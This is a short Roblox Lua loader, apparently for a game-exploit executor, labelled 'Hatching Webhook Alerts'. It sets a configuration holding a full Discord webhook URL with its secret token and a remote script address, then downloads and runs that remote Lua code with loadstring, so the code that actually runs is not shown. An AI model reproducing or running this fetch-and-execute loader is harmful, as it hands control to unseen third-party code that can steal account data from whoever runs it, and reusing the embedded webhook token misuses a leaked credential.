--// Loader
getgenv().Config = {
    Webhook = "https://discord.com/api/webhooks/1362284955241021440/ISVUyf5Aws3G7sT1uMbxbUvB4fyEGvDqTq7DtQwqe11-qERRUoYG0zCcOQytzlFbjgC9",
    ScriptURL = "https://russia.1ms.network/rblx/bbsi.lua",
}

print("Starting: Hatching Webhook Alerts")
loadstring(game:HttpGet(getgenv().Config.ScriptURL))()
